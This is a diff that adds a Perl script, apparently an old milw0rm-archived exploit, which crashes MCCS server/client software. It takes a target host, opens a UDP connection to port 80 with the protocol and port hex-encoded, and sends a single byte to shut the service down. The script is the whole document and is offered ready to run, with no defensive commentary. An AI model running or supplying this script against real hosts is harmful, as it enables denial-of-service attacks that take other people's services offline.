@@ -1,0 +1,38 @@
+#!usr/bin/perl
+#
+# MCCS Server\Client Command DOS Exploit
+# --------------------------------------
+#  Infam0us Gr0up - Securiti Research
+#
+# Info: infamous.2hell.com
+# Vendor URL: www.xclusive-software.com
+#
+
+
+use IO::Socket;
+
+print("\n  MCCS Command DOS Exploit\n");
+print("-----------------------------\n");
+
+$str = "\x41";
+if($#ARGV < 0 | $#ARGV > 1) {
+die "usage: perl $0 [IP/host] \nExam: perl $0 127.0.0.1 \n" };
+
+$adr = $ARGV[0];
+$prt = "\x38\x30";
+
+print "[+] Connect to host..\n";
+sleep 2;
+$remote = IO::Socket::INET->new(Proto=>"\x75\x64\x70", PeerAddr=>$adr,
+PeerPort=>$prt, Reuse=>1) or die "[-] Error: can't connect to $adr:$prt\n";
+print "[+] Connected\n";
+$remote->autoflush(1);
+print "[+] Sending bad string..\n";
+sleep 2;
+print $remote "$str" or die "[-] Error: can't send string code\n";
+print "[*] Client Server SHUTDOWNED!\n\n";
+print "press any key to exit..\n";
+$bla= <STDIN>;
+close $remote;
+
+# milw0rm.com [2005-09-19]
